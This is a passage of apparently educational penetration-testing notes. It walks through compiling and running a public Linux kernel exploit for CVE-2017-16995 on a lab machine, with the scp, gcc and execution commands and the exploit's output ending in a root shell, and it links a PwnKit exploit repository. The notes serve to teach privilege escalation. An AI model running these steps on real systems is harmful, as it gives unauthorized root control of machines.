+ To simplify this process, we could also rename the source filename to match the one expected by the exploit's procedure
+ Once renamed, we can simply paste the original exploit's instructions to compile the C code
```
mv 45010.c cve-2017-16995.c
```

To make sure that the compilation process goes as smooth as possible, we take advantage of the fact that our target is already shipped with GCC
+ For this reason we can compile and run the exploit on the target itself
+ As a consequence of this we can take advantage of including the correct version of the libraries required by the target's architecture
+ This setup will lower the risks related to any cross-compilation compatibility issues
+ To begin with, we transfer the exploit source code over the target machine via the SCP tool
```
scp cve-2017-16995.c joe@192.168.123.216:
```

Once transferred, we connect to the target machine and invoke GCC to compile the exploit, providing the source code as the first argument and the binary name as the output file to the **-o** parameter
```
joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
```

We can safely assume gcc compiled it correctly since it did not output any errors
+ Using the **`file`** utility, we can also inspect the Linux ELF file architecture
```
joe@ubuntu-privesc:~$ file cve-2017-16995
cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=588d687459a0e60bc6cb984b5180ec8c3558dc33, not stripped
```

With all the prerequisites in place we are now ready to run our Linux kernel privilege escalation exploit:
```
joe@ubuntu-privesc:~$ ./cve-2017-16995
[.]
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.]
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.]
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88007bd1f100
[*] Leaking sock struct from ffff880079bd9c00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880075c11e40
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880075c11e40
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
#
```
+ We managed to obtain a root shell by exploiting a known kernel vulnerability

CVE-2021-4034 - Pkexec Local Privilege Escalation: https://github.com/ly4k/PwnKit

